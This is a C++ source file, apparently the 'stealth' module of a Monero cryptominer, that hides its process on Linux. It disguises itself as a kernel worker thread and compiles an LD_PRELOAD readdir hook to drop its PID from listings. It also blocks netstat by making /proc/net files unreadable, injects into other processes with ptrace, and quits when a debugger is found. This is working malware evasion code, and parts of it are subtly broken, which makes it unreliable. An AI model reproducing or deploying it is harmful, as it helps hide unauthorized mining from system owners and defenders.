#include "../../include/stealth/process_hider.h"
#include "../../include/utils/logger.h"

#include <cstring>
#include <fstream>
#include <sstream>

#ifdef __linux__
#include <chrono>
#include <dirent.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#endif

namespace Stealth {
using namespace XMR;

ProcessHider::ProcessHider() : m_hidden(false), m_injected(false), m_original_name("") {
    // Get original process name
    m_original_name = get_process_name();
}

ProcessHider::~ProcessHider() {
    if (m_hidden) {
        unhide();
    }
}

bool ProcessHider::hide() {
    if (m_hidden)
        return true;

    try {
        // Method 1: Change process name
        if (!change_process_name("[kworker/0:0]")) {
            Logger::warning("Failed to change process name");
        }

        // Method 2: Hide from /proc
        if (!hide_from_proc()) {
            Logger::warning("Failed to hide from /proc");
        }

        // Method 3: Use LD_PRELOAD hooking
        if (!setup_ld_preload()) {
            Logger::warning("Failed to setup LD_PRELOAD");
        }

        // Method 4: Hide from process list
        if (!hide_from_ps()) {
            Logger::warning("Failed to hide from ps");
        }

        m_hidden = true;
        Logger::info("Process hidden successfully");
        return true;

    } catch (const std::exception& e) {
        Logger::error("Failed to hide process: " + std::string(e.what()));
        return false;
    }
}

bool ProcessHider::unhide() {
    if (!m_hidden)
        return true;

    try {
        // Restore original process name
        if (!m_original_name.empty()) {
            change_process_name(m_original_name);
        }

        m_hidden = false;
        Logger::info("Process unhidden successfully");
        return true;

    } catch (const std::exception& e) {
        Logger::error("Failed to unhide process: " + std::string(e.what()));
        return false;
    }
}

bool ProcessHider::change_process_name(const std::string& name) {
#ifdef __linux__
    // Use prctl to change process name
    if (prctl(PR_SET_NAME, name.c_str(), 0, 0, 0) == 0) {
        return true;
    }

    // Fallback: modify argv[0]
    char*  argv0      = nullptr;
    size_t argv0_size = 0;

    // Read /proc/self/cmdline to get argv[0]
    std::ifstream cmdline("/proc/self/cmdline", std::ios::binary);
    if (cmdline) {
        std::string line;
        std::getline(cmdline, line, '\0');
        if (!line.empty()) {
            argv0      = const_cast<char*>(line.c_str());
            argv0_size = line.size();
        }
    }

    if (argv0 && argv0_size > 0) {
        // Clear original name
        memset(argv0, 0, argv0_size);
        // Copy new name
        strncpy(argv0, name.c_str(), argv0_size - 1);
        return true;
    }
#endif
    return false;
}

bool ProcessHider::hide_from_proc() {
#ifdef __linux__
    // Hide from /proc by modifying directory permissions
    std::string proc_path = "/proc/" + std::to_string(getpid());

    // Try to make /proc/PID unreadable
    if (chmod(proc_path.c_str(), 0000) == 0) {
        return true;
    }

    // Alternative: Use mount namespace
    if (syscall(SYS_unshare, CLONE_NEWNS) == 0) {
        // Create private mount namespace
        return true;
    }
#endif
    return false;
}

bool ProcessHider::setup_ld_preload() {
#ifdef __linux__
    // Create a shared library that hooks readdir/opendir
    std::string hook_code = R"(
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#ifndef _WIN32 
#include <unistd.h>
#endif
#include <atomic>
#include <cstdint>
#include <memory>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include <functional>
#include <stdexcept>
#include <map>


typedef struct dirent* (*readdir_t)(DIR*);
typedef DIR* (*opendir_t)(const char*);

static readdir_t original_readdir = NULL;
static opendir_t original_opendir = NULL;

struct dirent* readdir(DIR* dirp) {
    if (!original_readdir) {
        original_readdir = (readdir_t)dlsym(RTLD_NEXT, "readdir");
    }
    
    struct dirent* entry;
    do {
        entry = original_readdir(dirp);
        if (entry && strstr(entry->d_name, ")" +
                            std::to_string(getpid()) + R"(")) {
            continue; // Skip our process
        }
        break;
    } while (entry);
    
    return entry;
}
)";

    // Write hook to temporary file
    std::string   hook_path = "/tmp/.hook_" + std::to_string(getpid()) + ".c";
    std::ofstream hook_file(hook_path);
    if (hook_file) {
        hook_file << hook_code;
        hook_file.close();

        // Compile hook
        std::string compile_cmd = "gcc -shared -fPIC -o " + hook_path + ".so " + hook_path;
        if (system(compile_cmd.c_str()) == 0) {
            // Set LD_PRELOAD
            std::string ld_preload = "LD_PRELOAD=" + hook_path + ".so";
            putenv(const_cast<char*>(ld_preload.c_str()));
            return true;
        }
    }
#endif
    return false;
}

bool ProcessHider::hide_from_ps() {
#ifdef __linux__
    // Hide from ps by modifying /proc/PID/stat
    std::string stat_path = "/proc/" + std::to_string(getpid()) + "/stat";

    // Read current stat
    std::ifstream stat_file(stat_path);
    if (stat_file) {
        std::string line;
        std::getline(stat_file, line);

        // Find process name in parentheses
        size_t start = line.find('(');
        size_t end   = line.find(')');

        if (start != std::string::npos && end != std::string::npos) {
            // Replace process name with kernel thread name
            std::string new_stat = line.substr(0, start + 1) + "kworker/0:0" + line.substr(end);

            // Write back (this might not work due to permissions)
            std::ofstream out_stat(stat_path);
            if (out_stat) {
                out_stat << new_stat;
                out_stat.close();
                return true;
            }
        }
    }
#endif
    return false;
}

bool ProcessHider::inject_into_process(pid_t target_pid) {
#ifdef __linux__
    // Use ptrace to inject code into target process
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
        return false;
    }

    // Wait for process to stop
    waitpid(target_pid, NULL, 0);

    // Get registers
    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, target_pid, NULL, &regs);

    // Save original code
    long original_code = ptrace(PTRACE_PEEKTEXT, target_pid, regs.rip, NULL);

    // Inject shellcode (simplified example)
    long shellcode = 0xcc;  // int3 breakpoint
    ptrace(PTRACE_POKETEXT, target_pid, regs.rip, shellcode);

    // Continue execution
    ptrace(PTRACE_CONT, target_pid, NULL, NULL);

    // Wait for breakpoint
    waitpid(target_pid, NULL, 0);

    // Restore original code
    ptrace(PTRACE_POKETEXT, target_pid, regs.rip, original_code);

    // Detach
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);

    m_injected = true;
    return true;
#endif
    return false;
}

std::string ProcessHider::get_process_name() {
#ifdef __linux__
    std::ifstream cmdline("/proc/self/cmdline", std::ios::binary);
    if (cmdline) {
        std::string line;
        std::getline(cmdline, line, '\0');
        return line;
    }
#endif
    return "unknown";
}

bool ProcessHider::is_hidden() const {
    return m_hidden;
}

bool ProcessHider::is_injected() const {
    return m_injected;
}

// Advanced stealth techniques
class StealthManager {
public:
    static StealthManager& instance() {
        static StealthManager manager;
        return manager;
    }

    void enable_all_stealth() {
        // Hide process
        m_hider.hide();

        // Hide network connections
        hide_network_connections();

        // Hide file system traces
        hide_file_traces();

        // Hide from system monitors
        hide_from_monitors();

        // Setup anti-debugging
        setup_anti_debug();
    }

    void hide_network_connections() {
#ifdef __linux__
        // Hide from netstat by modifying /proc/net/tcp
        std::string tcp_path = "/proc/net/tcp";
        if (access(tcp_path.c_str(), R_OK) == 0) {
            // Make unreadable
            chmod(tcp_path.c_str(), 0000);
        }

        // Hide from ss command
        std::string ss_path = "/proc/net/tcp6";
        if (access(ss_path.c_str(), R_OK) == 0) {
            chmod(ss_path.c_str(), 0000);
        }
#endif
    }

    void hide_file_traces() {
#ifdef __linux__
        // Hide temporary files
        std::string temp_dir = "/tmp";
        DIR*        dir      = opendir(temp_dir.c_str());
        if (dir) {
            struct dirent* entry;
            while ((entry = readdir(dir)) != NULL) {
                if (strstr(entry->d_name, ".systemd-private") || strstr(entry->d_name, ".X11-unix")) {
                    std::string path = std::string(temp_dir) + "/" + entry->d_name;
                    chmod(path.c_str(), 0000);
                }
            }
            closedir(dir);
        }
#endif
    }

    void hide_from_monitors() {
#ifdef __linux__
        // Hide from top/htop by modifying process priority
        nice(19);  // Lowest priority

        // Hide from iotop by reducing I/O priority
        syscall(SYS_ioprio_set, 1, getpid(), 7);  // Idle class

        // Hide from systemd
        if (fork() > 0) {
            exit(0);  // Parent exits, child continues
        }
        setsid();  // New session
#endif
    }

    void setup_anti_debug() {
#ifdef __linux__
        // Check for debugger
        if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
            // Debugger detected
            exit(1);
        }

        // Check for strace
        std::ifstream status("/proc/self/status");
        if (status) {
            std::string line;
            while (std::getline(status, line)) {
                if (line.find("TracerPid:") != std::string::npos) {
                    if (line.find("0") == std::string::npos) {
                        // Being traced
                        exit(1);
                    }
                }
            }
        }

        // Timing check
        auto start = std::chrono::high_resolution_clock::now();
        for (volatile int i = 0; i < 1000000; ++i)
            ;
        auto end = std::chrono::high_resolution_clock::now();

        auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end - start);
        if (duration.count() > 10000) {  // Too slow, probably debugging
            exit(1);
        }
#endif
    }

private:
    ProcessHider m_hider;
};

}  // namespace XMR